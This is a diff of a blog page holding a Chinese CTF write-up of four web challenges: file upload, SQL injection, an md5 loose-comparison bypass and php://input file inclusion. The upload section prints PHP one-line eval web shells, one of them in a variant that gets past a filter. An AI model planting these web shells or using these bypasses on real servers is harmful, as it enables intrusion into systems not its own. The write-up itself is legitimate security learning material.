@@ -511,7 +511,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="42">
-<input type="hidden" id="yelog_site_word_count" value="93.1k">
+<input type="hidden" id="yelog_site_word_count" value="92k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -876,18 +876,18 @@
         </a>
         
         <a  class="全部文章 CTF刷题 Crypto "
-           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
-           data-tag="Crypto"
-           data-author="" >
-            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
-            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
-        </a>
-        
-        <a  class="全部文章 CTF刷题 Crypto "
            href="/2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"
            data-tag="Crypto"
            data-author="" >
             <span class="post-title" title="实验吧--密码学">实验吧--密码学</span>
+            <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
+        </a>
+        
+        <a  class="全部文章 CTF刷题 Crypto "
+           href="/2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"
+           data-tag="Crypto"
+           data-author="" >
+            <span class="post-title" title="Bugku密码学（一）">Bugku密码学（一）</span>
             <span class="post-date" title="2019-07-14 00:17:13">2019/07/14</span>
         </a>
         
@@ -1070,7 +1070,7 @@
     </div>
     <div class="article-meta">
         
-        <span>字数:1.1k</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1110,16 +1110,49 @@
 <h3 id="1、想怎么传就怎么传，就是这么任性。"><a href="#1、想怎么传就怎么传，就是这么任性。" class="headerlink" title="1、想怎么传就怎么传，就是这么任性。"></a>1、想怎么传就怎么传，就是这么任性。</h3><p>题型：    Web Upload<br><img src="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题就是一个简单的文件上传题目；先用一个普通的php小马试一下：<code>&lt;?php @eval($_POST[&#39;smk&#39;]);?&gt;</code><br>然后发现文件是上传成功了，但是<code>&lt;? php</code>被过滤掉了<br>于是在网上找到另一个一句话，将php用大写绕过 修改后如下：<br><code>&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;smk&#39;])&lt;/script&gt;</code><br>然后连接菜刀就能看到flag了。<br><img src="http://img-blog.csdnimg.cn/20191103172707128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="2、出题人就告诉你这是个注入，有种别走！"><a href="#2、出题人就告诉你这是个注入，有种别走！" class="headerlink" title="2、出题人就告诉你这是个注入，有种别走！"></a>2、出题人就告诉你这是个注入，有种别走！</h3><p>题型：    Web Sql<br><img src="http://img-blog.csdnimg.cn/20191030162853663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目：<br><img src="http://img-blog.csdnimg.cn/20191103162535997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到题目的url就知道要对id注入。首先试一下order by，发现错误，可能是关键字过滤。试了试<code>/**/</code>还是不行，改用<code>&lt;&gt;</code>发现可以了，如图：<br><img src="http://img-blog.csdnimg.cn/2019110316284923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试得字段数为3，接下来就没啥好说的了，按顺序，爆库爆表爆字段<br><img src="http://img-blog.csdnimg.cn/20191103163918156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164216508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164928944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103165117879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p>
 <h3 id="3、这个真的是爆破。"><a href="#3、这个真的是爆破。" class="headerlink" title="3、这个真的是爆破。"></a>3、这个真的是爆破。</h3><p>题型：Misc    Web<br><img src="http://img-blog.csdnimg.cn/20191030195146808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，看到一段php语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);&#x2F;&#x2F; 关闭错误报告</span><br><span class="line">session_start();&#x2F;&#x2F;启动会话</span><br><span class="line">require(&#39;.&#x2F;flag.php&#39;);</span><br><span class="line">if(!isset($_SESSION[&#39;nums&#39;]))&#123;&#x2F;&#x2F;isset() — 检测变量是否设置。</span><br><span class="line">  $_SESSION[&#39;nums&#39;] &#x3D; 0;</span><br><span class="line">  $_SESSION[&#39;time&#39;] &#x3D; time();&#x2F;&#x2F;返回当前时间的 Unix 时间戳</span><br><span class="line">  $_SESSION[&#39;whoami&#39;] &#x3D; &#39;ea&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;time&#39;]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();&#x2F;&#x2F;session_destroy — 销毁一个会话中的全部数据</span><br><span class="line">&#125;&#x2F;&#x2F;120s后会话结束</span><br><span class="line"></span><br><span class="line">$value &#x3D; $_REQUEST[&#39;value&#39;];</span><br><span class="line">$str_rand &#x3D; range(&#39;a&#39;, &#39;z&#39;);&#x2F;&#x2F;range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组</span><br><span class="line">$str_rands &#x3D; $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];&#x2F;&#x2F;mt_rand() 使用 Mersenne Twister 算法返回0到25之间的随机整数。$str_rand[mt_rand(0,25)]返回&quot;a&quot; 到 &quot;z&quot;之间任意字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]是两任意字母相连</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;whoami&#39;]&#x3D;&#x3D;($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)&#x3D;&#x3D;0)&#123;&#x2F;&#x2F;substr(string,start,length)。&#x3D;&#x3D;&#x3D;是包括变量值与类型完全相等。&#x3D;&#x3D;只是比较两个数的值是否相等，由于substr是字符串，和数字比较的时候会强制转化成数字0，自然和0相等。</span><br><span class="line">  $_SESSION[&#39;nums&#39;]++;</span><br><span class="line">  $_SESSION[&#39;whoami&#39;] &#x3D; $str_rands;</span><br><span class="line">  echo $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&#39;nums&#39;]&gt;&#x3D;10)&#123;&#x2F;&#x2F;循环10次输出flag，暴力破解</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>error_reporting(0);// 关闭错误报告
+session_start();//启动会话
+require(&#39;./flag.php&#39;);
+if(!isset($_SESSION[&#39;nums&#39;]))&#123;//isset() — 检测变量是否设置。
+  $_SESSION[&#39;nums&#39;] = 0;
+  $_SESSION[&#39;time&#39;] = time();//返回当前时间的 Unix 时间戳
+  $_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;
+&#125;
+
+if($_SESSION[&#39;time&#39;]+120&lt;time())&#123;
+  session_destroy();//session_destroy — 销毁一个会话中的全部数据
+&#125;//120s后会话结束
+
+$value = $_REQUEST[&#39;value&#39;];
+$str_rand = range(&#39;a&#39;, &#39;z&#39;);//range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组
+$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];//mt_rand() 使用 Mersenne Twister 算法返回0到25之间的随机整数。$str_rand[mt_rand(0,25)]返回&quot;a&quot; 到 &quot;z&quot;之间任意字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]是两任意字母相连
+
+if($_SESSION[&#39;whoami&#39;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//substr(string,start,length)。===是包括变量值与类型完全相等。==只是比较两个数的值是否相等，由于substr是字符串，和数字比较的时候会强制转化成数字0，自然和0相等。
+  $_SESSION[&#39;nums&#39;]++;
+  $_SESSION[&#39;whoami&#39;] = $str_rands;
+  echo $str_rands;
+&#125;
+
+if($_SESSION[&#39;nums&#39;]&gt;=10)&#123;//循环10次输出flag，暴力破解
+  echo $flag;
+&#125;
+
+show_source(__FILE__);
+?&gt;</code></pre>
 <p>因为md5不能对数组进行处理，MD5()计算数组会返回null，里面的判断是用==所以我们用数组传值那么<code>substr(md5($value),5,4)==0</code>这个条件恒成立。<br>因为我刚访问由于这段代码<code>$_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;</code> 我们要先传入<code>?value[]=ea</code> </p>
 <p>那么nums就会自增，<code>$_SEESION[&#39;whoami&#39;] = 随机2个字母</code> </p>
 <p>并同时输出到页面上，我们再根据输出的字符修改<code>$value[0].$value[1]</code>的值即可，只要操作大于等于10次，就可以出flag 。<br><img src="http://img-blog.csdnimg.cn/20191103170830809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>综上所述循环10次后输出flag：<br><img src="http://img-blog.csdnimg.cn/20191030175352961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="4、没错！就是文件包含漏洞"><a href="#4、没错！就是文件包含漏洞" class="headerlink" title="4、没错！就是文件包含漏洞"></a>4、没错！就是文件包含漏洞</h3><p>题型：Web Upload<br>知识点：<br>1、当php开启allow_url_include的时候，可以用php://input伪协议包含文件<br>2、php中的system命令执行函数<br><img src="http://img-blog.csdnimg.cn/20191031202054697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>这题也挺简单，利用了<strong>php伪协议</strong> ：</p>
 <ol>
-<li>php://input<br>构造场景：本地web服务器根目录下有文件<code>phpinput_server.php</code>，代码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	 $a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">	 $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39;</span><br><span class="line">	 echo $raw_post_data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-在浏览器中按照如下方式访问：<br>地址栏输入的是：<code>http://localhost/phpinput_server.php?a=php://input</code><br>post框直接输入一段数据<br>Excute后，脚本会在页面中输出这段数据。<br><img src="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：此种方式可以用来获取post数据，但不能获取get数据。</li>
+<li>php://input<br>构造场景：本地web服务器根目录下有文件<code>phpinput_server.php</code>，代码如下：<pre><code>&lt;?php
+  $a = $_GET[&#39;a&#39;];
+  $raw_post_data = file_get_contents($a,&#39;r&#39;);//&#39;php://input&#39;
+  echo $raw_post_data;
+?&gt;</code></pre>
+</li>
 </ol>
+<p>在浏览器中按照如下方式访问：<br>地址栏输入的是：<code>http://localhost/phpinput_server.php?a=php://input</code><br>post框直接输入一段数据<br>Excute后，脚本会在页面中输出这段数据。<br><img src="http://img-blog.csdnimg.cn/20191031203305913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总结：此种方式可以用来获取post数据，但不能获取get数据。</p>
 <p>既然题目是文件包含，我们来看下关键性函数的状态<br>allow_url_include<br><img src="http://img-blog.csdnimg.cn/20191031205339435.png" alt="在这里插入图片描述"><br>当<code>allow_url_include</code>为On而<code>allow_url_fopen</code>为Off的时候，我们可以用用<strong>php://input</strong>伪协议进行包含<br><img src="https://img-blog.csdnimg.cn/20191031205614164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到目录下有三个文件，flag是在第一个文件里<br>查看dle345aae.php：<br><img src="http://img-blog.csdnimg.cn/20191031212358170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">右键查看源码：得到flag<br><img src="http://img-blog.csdnimg.cn/20191031201323703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
       
